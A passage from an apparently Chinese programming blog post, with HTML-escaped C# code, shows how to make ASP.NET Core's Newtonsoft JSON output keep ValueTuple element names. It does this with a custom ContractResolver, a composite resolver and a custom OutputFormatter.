        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; &lt;span&gt;bool&lt;/span&gt; IsValueTuple(&lt;span&gt;this&lt;/span&gt;&lt;span&gt; Type type)
        {
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; _cacheIsValueTuple.GetOrAdd(type, x =&amp;gt; x.IsValueType &amp;amp;&amp;amp; x.IsGenericType &amp;amp;&amp;amp;&lt;span&gt;
                                                          (x.FullName.StartsWith(&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;System.ValueTuple&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;) ||&lt;span&gt; x.FullName
                                                              &lt;/span&gt;?.StartsWith(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;System.ValueTuple`&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;) == &lt;span&gt;true&lt;/span&gt;&lt;span&gt;)
                                                          );

        }
    }&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;　　那么开始来定义一个&lt;strong&gt;ContractResolver,&lt;span&gt;实现的原理请看注释&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;63&quot;&gt;
&lt;pre&gt;
&lt;span&gt;　　public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; CustomContractResolver : DefaultContractResolver
    {
        &lt;/span&gt;&lt;span&gt;private&lt;/span&gt; MethodInfo _methodInfo = &lt;span&gt;null&lt;/span&gt;&lt;span&gt;;
        &lt;/span&gt;&lt;span&gt;private&lt;/span&gt; IContractResolver _parentResolver = &lt;span&gt;null&lt;/span&gt;&lt;span&gt;;

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; CustomContractResolver(MethodInfo methodInfo, IContractResolver? parentContractResolver = &lt;span&gt;null&lt;/span&gt;&lt;span&gt;)
        {
            _methodInfo &lt;/span&gt;=&lt;span&gt; methodInfo;
            _parentResolver &lt;/span&gt;=&lt;span&gt; parentContractResolver;
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;override&lt;/span&gt;&lt;span&gt; JsonContract ResolveContract(Type type)
        {
            &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (!&lt;span&gt;type.GetProperties()
                .Where(x &lt;/span&gt;=&amp;gt; x.CanRead &amp;amp;&amp;amp;&lt;span&gt; x.PropertyType.IsValueTuple())
                .Any())  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;如果Type类中不包含可读的ValueTuple类型的属性,则调用预定义的Resolver处理,当前Resolver只处理包含ValueTuple的类&lt;/span&gt;
&lt;span&gt;            {
                &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; _parentResolver?&lt;span&gt;.ResolveContract(type);
            }

            &lt;/span&gt;&lt;span&gt;var&lt;/span&gt; rc = &lt;span&gt;base&lt;/span&gt;&lt;span&gt;.ResolveContract(type);

            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; rc;
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; MethodInfo Method =&amp;gt;&lt;span&gt; _methodInfo;

        &lt;/span&gt;&lt;span&gt;protected&lt;/span&gt; &lt;span&gt;override&lt;/span&gt;&lt;span&gt; JsonProperty CreateProperty(MemberInfo member, MemberSerialization memberSerialization)
        {
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;CreateProperty函数的结果,不需要额外加缓存,因为每个Method的返回Type,只会调用一次&lt;/span&gt;
            JsonProperty property = &lt;span&gt;base&lt;/span&gt;.CreateProperty(member, memberSerialization);  &lt;span&gt;//&lt;/span&gt;&lt;span&gt;先调用默认的CreateProperty函数,创建出默认JsonProperty&lt;/span&gt;

            &lt;span&gt;var&lt;/span&gt; pi = member &lt;span&gt;as&lt;/span&gt;&lt;span&gt; PropertyInfo;

            &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt; (property.PropertyType.IsValueTuple())
            {
                &lt;/span&gt;&lt;span&gt;var&lt;/span&gt; attr = pi.GetCustomAttribute&amp;lt;TupleElementNamesAttribute&amp;gt;();  &lt;span&gt;//&lt;/span&gt;&lt;span&gt;获取定义在属性上的特性&lt;/span&gt;

                &lt;span&gt;if&lt;/span&gt; (attr != &lt;span&gt;null&lt;/span&gt;&lt;span&gt;)  
                {
                    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;如果该属性是已经编译时有添加了TupleElementNamesAttribute特性的,,则不需要从method获取
                    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;这里主要是为了处理 (string str1,int int2) Prop3 这种情况&lt;/span&gt;
                    property.Converter = &lt;span&gt;new&lt;/span&gt; ValueTupleConverter(attr, &lt;span&gt;this&lt;/span&gt;&lt;span&gt;.NamingStrategy);
                }
                &lt;/span&gt;&lt;span&gt;else&lt;/span&gt;&lt;span&gt; 
                {
                    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;从输入的method获取,并且需要计算当前属性所属的泛型是在第几个,然后计算出在TupleElementNamesAttribute.Names中的偏移
                    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;这个主要是处理比如T2 Prop2 T2=ValueTuple的这种情况&lt;/span&gt;
                    &lt;span&gt;var&lt;/span&gt; mAttr = (TupleElementNamesAttribute)_methodInfo.ReturnTypeCustomAttributes.GetCustomAttributes(&lt;span&gt;typeof&lt;/span&gt;(TupleElementNamesAttribute), &lt;span&gt;true&lt;/span&gt;).FirstOrDefault(); &lt;span&gt;//&lt;/span&gt;&lt;span&gt;用来获取valueTuple的各个字段名称&lt;/span&gt;
                    &lt;span&gt;var&lt;/span&gt; basePropertyClass = pi.DeclaringType.GetGenericTypeDefinition(); &lt;span&gt;//&lt;/span&gt;&lt;span&gt;属性定义的泛型基类 如 A&amp;lt;T1,T2&amp;gt;&lt;/span&gt;
                    &lt;span&gt;var&lt;/span&gt; basePropertyType = basePropertyClass.GetProperty(pi.Name)!.PropertyType; &lt;span&gt;//&lt;/span&gt;&lt;span&gt;获取基类属性的返回类型 就是T1 ,比如获取在A&amp;lt;(string str1,string str2),(string str3,string str4)&amp;gt; 中 Prop1 返回的类型是对应基类中的T1还是T2&lt;/span&gt;
                    &lt;span&gt;var&lt;/span&gt; index = basePropertyType.GenericParameterPosition;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;获取属性所在的序号,用于计算 mAttr.Names中的偏移量&lt;/span&gt;
                    &lt;span&gt;var&lt;/span&gt; skipNamesCount = (pi.DeclaringType &lt;span&gt;as&lt;/span&gt;&lt;span&gt; TypeInfo).GenericTypeArguments
                                            .Take(index)
                                            .Sum(x &lt;/span&gt;=&amp;gt; x.IsValueTuple() ? x.GenericTypeArguments.Length : &lt;span&gt;0&lt;/span&gt;); ;  &lt;span&gt;//&lt;/span&gt;&lt;span&gt;计算TupleElementNamesAttribute.TransformNames中当前类的偏移量&lt;/span&gt;
                    &lt;span&gt;var&lt;/span&gt; names =&lt;span&gt; mAttr.TransformNames
                        .Skip(skipNamesCount)
                        .Take(pi.PropertyType.GenericTypeArguments.Length)
                        .ToArrayEx(); &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;获取当前类的所有name&lt;/span&gt;
                    property.Converter = &lt;span&gt;new&lt;/span&gt; ValueTupleConverter(names, &lt;span&gt;this&lt;/span&gt;.NamingStrategy);  &lt;span&gt;//&lt;/span&gt;&lt;span&gt;传入converter&lt;/span&gt;
&lt;span&gt;                }

                property.GetIsSpecified &lt;/span&gt;= x =&amp;gt; &lt;span&gt;true&lt;/span&gt;&lt;span&gt;;
                property.ItemConverter &lt;/span&gt;= property.Converter;  &lt;span&gt;//&lt;/span&gt;&lt;span&gt;传入converter&lt;/span&gt;
                property.ShouldSerialize = x =&amp;gt; &lt;span&gt;true&lt;/span&gt;&lt;span&gt;;
                property.HasMemberAttribute &lt;/span&gt;= &lt;span&gt;false&lt;/span&gt;&lt;span&gt;;
            }
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; property;
        }
        &lt;/span&gt;&lt;span&gt;protected&lt;/span&gt; &lt;span&gt;override&lt;/span&gt; JsonConverter? ResolveContractConverter(Type objectType) &lt;span&gt;//&lt;/span&gt;&lt;span&gt;该函数可用于返回特定类型类型的JsonConverter&lt;/span&gt;
&lt;span&gt;        {
            &lt;/span&gt;&lt;span&gt;var&lt;/span&gt; type = &lt;span&gt;base&lt;/span&gt;&lt;span&gt;.ResolveContractConverter(objectType);

            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;这里主要是为了忽略一些在class上定义了JsonConverter的情况,因为有些比如 A&amp;lt;T1,T2&amp;gt; 在序列化的时候,并无法知道ValueTuple定义的属性名,这里添加忽略是为了跳过已定义过的JsonConverter
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;如有需要,可在这里多添加几个&lt;/span&gt;
            &lt;span&gt;if&lt;/span&gt; (type &lt;span&gt;is&lt;/span&gt;&lt;span&gt; ResultReturnConverter)
            {
                &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; &lt;span&gt;null&lt;/span&gt;&lt;span&gt;;
            }
            &lt;/span&gt;&lt;span&gt;else&lt;/span&gt;&lt;span&gt;
            {
                &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; type;
            }
        }
    }&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;　　为了能兼容用于预先定义的&lt;strong&gt;ContractResolver&lt;/strong&gt;,因此,先定义一个&lt;strong&gt;CompositeContractResolver,&lt;/strong&gt;用于合并多个&lt;strong&gt;&lt;strong&gt;ContractResolver,可看可不看:&lt;/strong&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; onclick=&quot;cnblogs_code_show('661cd39c-9408-44fd-9f00-97e49f4c8d82')&quot; readability=&quot;37.5&quot;&gt;&lt;img id=&quot;code_img_closed_661cd39c-9408-44fd-9f00-97e49f4c8d82&quot; class=&quot;code_img_closed&quot; src=&quot;https://images.cnblogs.com/OutliningIndicators/ContractedBlock.gif&quot; alt=&quot;&quot;/&gt;&lt;img id=&quot;code_img_opened_661cd39c-9408-44fd-9f00-97e49f4c8d82&quot; class=&quot;code_img_opened&quot; onclick=&quot;cnblogs_code_hide('661cd39c-9408-44fd-9f00-97e49f4c8d82',event)&quot; src=&quot;https://images.cnblogs.com/OutliningIndicators/ExpandedBlockStart.gif&quot; alt=&quot;&quot;/&gt;&lt;div id=&quot;cnblogs_code_open_661cd39c-9408-44fd-9f00-97e49f4c8d82&quot; class=&quot;cnblogs_code_hide&quot; readability=&quot;70&quot;&gt;
&lt;pre&gt;
&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;summary&amp;gt;&lt;/span&gt;
    &lt;span&gt;///&lt;/span&gt;&lt;span&gt; 合并多个IContractResolver,,并只返回第一个返回非null的Contract,如果所有列表中的ContractResolver都返回null,则调用DefaultContractResolver返回默认的JsonContract
    &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;/summary&amp;gt;&lt;/span&gt;
    &lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt; CompositeContractResolver : IContractResolver, IEnumerable&amp;lt;IContractResolver&amp;gt;&lt;span&gt;
    {
        &lt;/span&gt;&lt;span&gt;private&lt;/span&gt; &lt;span&gt;readonly&lt;/span&gt; IList&amp;lt;IContractResolver&amp;gt; _contractResolvers = &lt;span&gt;new&lt;/span&gt; List&amp;lt;IContractResolver&amp;gt;&lt;span&gt;();
        &lt;/span&gt;&lt;span&gt;private&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; DefaultContractResolver _defaultResolver = &lt;span&gt;new&lt;/span&gt;&lt;span&gt; DefaultContractResolver();
        &lt;/span&gt;&lt;span&gt;private&lt;/span&gt; ConcurrentDictionary&amp;lt;Type, JsonContract&amp;gt; _cacheContractResolvers=&lt;span&gt;new&lt;/span&gt; ConcurrentDictionary&amp;lt;Type, JsonContract&amp;gt;&lt;span&gt;();

        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt;&lt;span&gt; 返回列表中第一个返回非null的Contract,如果所有列表中的ContractResolver都返回null,则调用DefaultContractResolver返回默认的JsonContract
        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;/summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;param name=&quot;type&quot;&amp;gt;&amp;lt;/param&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;returns&amp;gt;&amp;lt;/returns&amp;gt;&lt;/span&gt;
        &lt;span&gt;public&lt;/span&gt;&lt;span&gt; JsonContract ResolveContract(Type type)
        {
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; _cacheContractResolvers.GetOrAdd(type, m =&amp;gt;&lt;span&gt;
            {
                &lt;/span&gt;&lt;span&gt;for&lt;/span&gt; (&lt;span&gt;int&lt;/span&gt; i = &lt;span&gt;0&lt;/span&gt;; i &amp;lt; _contractResolvers.Count; i++&lt;span&gt;)
                {
                    &lt;/span&gt;&lt;span&gt;var&lt;/span&gt; contact =&lt;span&gt; _contractResolvers[i].ResolveContract(type);

                    &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (contact != &lt;span&gt;null&lt;/span&gt;&lt;span&gt;)
                    {
                        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; contact;
                    }
                }

                &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; _defaultResolver.ResolveContract(type);
            });
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; Add(IContractResolver contractResolver)
        {
            &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (contractResolver == &lt;span&gt;null&lt;/span&gt;) &lt;span&gt;return&lt;/span&gt;&lt;span&gt;;

            _contractResolvers.Add(contractResolver);
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; IEnumerator&amp;lt;IContractResolver&amp;gt;&lt;span&gt; GetEnumerator()
        {
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; _contractResolvers.GetEnumerator();
        }

        IEnumerator IEnumerable.GetEnumerator()
        {
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; GetEnumerator();
        }
    }&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;span class=&quot;cnblogs_code_collapse&quot;&gt;View Code&lt;/span&gt;&lt;/div&gt;
&lt;p&gt;　　接下来,就该定义OutputFormatter了&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;63&quot;&gt;
&lt;pre&gt;
&lt;span&gt;　　public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; ValueTupleOutputFormatter : TextOutputFormatter
    {
        &lt;/span&gt;&lt;span&gt;private&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; ConcurrentDictionary&amp;lt;Type, &lt;span&gt;bool&lt;/span&gt;&amp;gt; _canHandleType = &lt;span&gt;new&lt;/span&gt; ConcurrentDictionary&amp;lt;Type, &lt;span&gt;bool&lt;/span&gt;&amp;gt;();  &lt;span&gt;//&lt;/span&gt;&lt;span&gt;缓存一个Type是否能处理,提高性能,不用每次都判断&lt;/span&gt;
        &lt;span&gt;private&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; ConcurrentDictionary&amp;lt;MethodInfo, JsonSerializerSettings&amp;gt; _cacheSettings = &lt;span&gt;new&lt;/span&gt; ConcurrentDictionary&amp;lt;MethodInfo, JsonSerializerSettings&amp;gt;(); &lt;span&gt;//&lt;/span&gt;&lt;span&gt;用于缓存不同的函数的JsonSerializerSettings,各自定义,避免相互冲突&lt;/span&gt;

        &lt;span&gt;private&lt;/span&gt; Action&amp;lt;ValueTupleContractResolver&amp;gt; _resolverConfigFunc = &lt;span&gt;null&lt;/span&gt;&lt;span&gt;;

        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt; 
        &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;/summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;param name=&quot;resolverConfigFunc&quot;&amp;gt;&lt;/span&gt;&lt;span&gt;用于在注册Formatter的时候对ContractResolver进行配置修改,比如属性名的大小写之类的&lt;/span&gt;&lt;span&gt;&amp;lt;/param&amp;gt;&lt;/span&gt;
        &lt;span&gt;public&lt;/span&gt; ValueTupleOutputFormatter(Action&amp;lt;ValueTupleContractResolver&amp;gt; resolverConfigFunc = &lt;span&gt;null&lt;/span&gt;&lt;span&gt;)
        {
            SupportedMediaTypes.Add(&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;application/json&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;);
            SupportedMediaTypes.Add(&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;text/json&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;);
            SupportedEncodings.Add(Encoding.UTF8);
            SupportedEncodings.Add(Encoding.Unicode);

            _resolverConfigFunc &lt;/span&gt;=&lt;span&gt; resolverConfigFunc;
        }

        &lt;/span&gt;&lt;span&gt;protected&lt;/span&gt; &lt;span&gt;override&lt;/span&gt; &lt;span&gt;bool&lt;/span&gt;&lt;span&gt; CanWriteType(Type type)
        {
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; _canHandleType.GetOrAdd(type, t =&amp;gt;&lt;span&gt;
            {
                &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; type.GetProperties()  &lt;span&gt;//&lt;/span&gt;&lt;span&gt;判断该类是否包含有ValueTuple的属性&lt;/span&gt;
                    .Where(x =&amp;gt; x.CanRead &amp;amp;&amp;amp; (CustomAttributeExtensions.GetCustomAttribute&amp;lt;TupleElementNamesAttribute&amp;gt;((MemberInfo) x) != &lt;span&gt;null&lt;/span&gt; ||&lt;span&gt; x.PropertyType.IsValueTuple()))
                    .Any();
            });
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;override&lt;/span&gt; &lt;span&gt;async&lt;/span&gt;&lt;span&gt; Task WriteResponseBodyAsync(OutputFormatterWriteContext context, Encoding selectedEncoding)
        {
            &lt;/span&gt;&lt;span&gt;var&lt;/span&gt; acce = (IActionContextAccessor)context.HttpContext.RequestServices.GetService(&lt;span&gt;typeof&lt;/span&gt;&lt;span&gt;(IActionContextAccessor));

&lt;/span&gt;&lt;span&gt;#if&lt;/span&gt; NETCOREAPP2_1
            &lt;span&gt;var&lt;/span&gt; ac = acce.ActionContext.ActionDescriptor &lt;span&gt;as&lt;/span&gt;&lt;span&gt; ControllerActionDescriptor;
&lt;/span&gt;&lt;span&gt;#endif&lt;/span&gt;
&lt;span&gt;#if&lt;/span&gt; NETCOREAPP3_0
            &lt;span&gt;var&lt;/span&gt; endpoint =&lt;span&gt; acce.ActionContext.HttpContext.GetEndpoint();
            &lt;/span&gt;&lt;span&gt;var&lt;/span&gt; ac = endpoint.Metadata.GetMetadata&amp;lt;ControllerActionDescriptor&amp;gt;();   &lt;span&gt;//&lt;/span&gt;&lt;span&gt;用来获取当前Action对应的函数信息&lt;/span&gt;
&lt;span&gt;#endif&lt;/span&gt;
            &lt;span&gt;var&lt;/span&gt; settings = _cacheSettings.GetOrAdd(ac.MethodInfo, m =&amp;gt;  &lt;span&gt;//&lt;/span&gt;&lt;span&gt;这里主要是为了配置settings,每个methodinfo对应一个自己的settings,当然也就是每个MethodInfo一个CustomContractResolver,防止相互冲突&lt;/span&gt;
&lt;span&gt;            {
                &lt;/span&gt;&lt;span&gt;var&lt;/span&gt; orgSettings = JsonConvert.DefaultSettings?.Invoke();  &lt;span&gt;//&lt;/span&gt;&lt;span&gt;获取默认的JsonSettings&lt;/span&gt;
                &lt;span&gt;var&lt;/span&gt; tmp = orgSettings != &lt;span&gt;null&lt;/span&gt; ? cloneSettings(orgSettings) : &lt;span&gt;new&lt;/span&gt; JsonSerializerSettings();  &lt;span&gt;//&lt;/span&gt;&lt;span&gt;如果不存在默认的,则new一个,如果已存在,则clone一个新的&lt;/span&gt;
                &lt;span&gt;var&lt;/span&gt; resolver = &lt;span&gt;new&lt;/span&gt; ValueTupleContractResolver(m, tmp.ContractResolver &lt;span&gt;is&lt;/span&gt; CompositeContractResolver ? &lt;span&gt;null&lt;/span&gt; : tmp.ContractResolver); &lt;span&gt;//&lt;/span&gt;&lt;span&gt;创建自定义ContractResolver,传入函数信息&lt;/span&gt;
&lt;span&gt;
                _resolverConfigFunc&lt;/span&gt;?.Invoke(resolver);  &lt;span&gt;//&lt;/span&gt;&lt;span&gt;调用配置函数&lt;/span&gt;

                &lt;span&gt;if&lt;/span&gt; (tmp.ContractResolver != &lt;span&gt;null&lt;/span&gt;)  &lt;span&gt;//&lt;/span&gt;&lt;span&gt;如果已定义过ContractResolver,则使用CompositeContractResolver进行合并&lt;/span&gt;
&lt;span&gt;                {
                    &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (tmp.ContractResolver &lt;span&gt;is&lt;/span&gt; CompositeContractResolver c)  &lt;span&gt;//&lt;/span&gt;&lt;span&gt;如果定义的是CompositeContractResolver,则直接插入到最前&lt;/span&gt;
&lt;span&gt;                    {
                        c.Insert(&lt;/span&gt;&lt;span&gt;0&lt;/span&gt;&lt;span&gt;, resolver);
                    }
                    &lt;/span&gt;&lt;span&gt;else&lt;/span&gt;&lt;span&gt;
                    {
                        tmp.ContractResolver &lt;/span&gt;= &lt;span&gt;new&lt;/span&gt;&lt;span&gt; CompositeContractResolver()
                        {
                            resolver,
                            tmp.ContractResolver
                        };
                    }
                }
                &lt;/span&gt;&lt;span&gt;else&lt;/span&gt;&lt;span&gt;
                {
                    tmp.ContractResolver &lt;/span&gt;= &lt;span&gt;new&lt;/span&gt;&lt;span&gt; CompositeContractResolver()
                    {
                        resolver
                    };
                }

                &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; tmp;
            });

            &lt;/span&gt;&lt;span&gt;var&lt;/span&gt; json = JsonConvert.SerializeObject(context.Object, Formatting.None, settings);  &lt;span&gt;//&lt;/span&gt;&lt;span&gt;调用序列化器进行序列化&lt;/span&gt;
            &lt;span&gt;await&lt;/span&gt;&lt;span&gt; context.HttpContext.Response.Body.WriteAsync(selectedEncoding.GetBytes(json));
        }

        &lt;/span&gt;&lt;span&gt;private&lt;/span&gt;&lt;span&gt; JsonSerializerSettings cloneSettings(JsonSerializerSettings settings)
        {
            &lt;/span&gt;&lt;span&gt;var&lt;/span&gt; tmp = &lt;span&gt;new&lt;/span&gt;&lt;span&gt; JsonSerializerSettings();

            &lt;/span&gt;&lt;span&gt;var&lt;/span&gt; properties =&lt;span&gt; settings.GetType().GetProperties();

            &lt;/span&gt;&lt;span&gt;foreach&lt;/span&gt; (&lt;span&gt;var&lt;/span&gt; property &lt;span&gt;in&lt;/span&gt;&lt;span&gt; properties)
            {
                &lt;/span&gt;&lt;span&gt;var&lt;/span&gt; pvalue =&lt;span&gt; property.GetValue(settings);

                &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (pvalue &lt;span&gt;is&lt;/span&gt;&lt;span&gt; ICloneable p2)
                {
                    property.SetValue(tmp, p2.Clone());
                }
                &lt;/span&gt;&lt;span&gt;else&lt;/span&gt;&lt;span&gt;
                {
                    property.SetValue(tmp, pvalue);
                }
            }

            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; tmp;
        }

    }&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;　　到此,该定义的类都定义完了,下面是注册方法:在Start.cs中:&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;38&quot;&gt;
&lt;pre&gt;
&lt;span&gt;　　　　public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; ConfigureServices(IServiceCollection services)
        {&lt;/span&gt;&lt;span&gt;
            services.AddControllersWithViews(opt &lt;/span&gt;=&amp;gt;&lt;span&gt;
            {
                opt.OutputFormatters.Insert(&lt;/span&gt;&lt;span&gt;0&lt;/span&gt;,&lt;span&gt;new&lt;/span&gt; ValueTupleOutFormatter(x =&amp;gt;&lt;span&gt;
                {
                    x.NamingStrategy&lt;/span&gt;= &lt;span&gt;new&lt;/span&gt; CamelCaseNamingStrategy(&lt;span&gt;true&lt;/span&gt;,&lt;span&gt;true&lt;/span&gt;&lt;span&gt;);  //这里主要是为了演示对CustomContractResolver的配置,设置了所有属性首字母小写
                }));
            }).AddNewtonsoftJson();
        }&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;　　注册完成后,用下面的Action可测试:&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; onclick=&quot;cnblogs_code_show('74f2c6fa-126d-46c6-987c-8a4269610028')&quot; readability=&quot;39&quot;&gt;&lt;img id=&quot;code_img_closed_74f2c6fa-126d-46c6-987c-8a4269610028&quot; class=&quot;code_img_closed&quot; src=&quot;https://images.cnblogs.com/OutliningIndicators/ContractedBlock.gif&quot; alt=&quot;&quot;/&gt;&lt;img id=&quot;code_img_opened_74f2c6fa-126d-46c6-987c-8a4269610028&quot; class=&quot;code_img_opened&quot; onclick=&quot;cnblogs_code_hide('74f2c6fa-126d-46c6-987c-8a4269610028',event)&quot; src=&quot;https://images.cnblogs.com/OutliningIndicators/ExpandedBlockStart.gif&quot; alt=&quot;&quot;/&gt;&lt;div id=&quot;cnblogs_code_open_74f2c6fa-126d-46c6-987c-8a4269610028&quot; class=&quot;cnblogs_code_hide&quot; readability=&quot;73&quot;&gt;
&lt;pre&gt;
    &lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; ApiTestController : ControllerBase
    {
        [FromBodyJson()]
        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; IActionResult test1(List&amp;lt;(&lt;span&gt;string&lt;/span&gt; productid,&lt;span&gt;int&lt;/span&gt; qty)&amp;gt;&lt;span&gt; details)
        {

            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; Content(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;success&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;);
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; ResultReturn&amp;lt;(&lt;span&gt;string&lt;/span&gt; str1, &lt;span&gt;int&lt;/span&gt; int3)&amp;gt;&lt;span&gt; Test()
        {
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; &lt;span&gt;new&lt;/span&gt; SuccessResultReturn&amp;lt;(&lt;span&gt;string&lt;/span&gt; str1, &lt;span&gt;int&lt;/span&gt; int3)&amp;gt;((&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;2222&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;,&lt;span&gt;222&lt;/span&gt;&lt;span&gt;));
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; Test&amp;lt;(&lt;span&gt;string&lt;/span&gt; Y1, &lt;span&gt;string&lt;/span&gt; Y2), (&lt;span&gt;string&lt;/span&gt; str1, &lt;span&gt;string&lt;/span&gt; t2)&amp;gt;&lt;span&gt; Test2()
        {
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; &lt;span&gt;new&lt;/span&gt; Test&amp;lt; (&lt;span&gt;string&lt;/span&gt; Y1, &lt;span&gt;string&lt;/span&gt; Y2),(&lt;span&gt;string&lt;/span&gt; str1, &lt;span&gt;string&lt;/span&gt; t2)&amp;gt;((&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;111&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;,&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;22222&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;),(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;3333&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;,&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;44444&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;) );
        }
    }&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;span class=&quot;cnblogs_code_collapse&quot;&gt;View Code&lt;/span&gt;&lt;/div&gt;

&lt;p&gt;　　&lt;span&gt;&lt;strong&gt;总结一下,上面实现的原理是: 自定义一个OutputFormatter,在WriteResponseBodyAsync中,可以获取到当前的Action对应的MethodInfo,然后利用编译器在所有返回ValueTuple的地方,都加了TupleElementNamesAttribute的功能,获取到使用时定义的ValueTuple各个Item的名字,再利用ContractResolver的CreateProperty功能,将定义的各个Item转换为对应的name.然后使用newtonsoft的序列化器,进行json序列化.&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
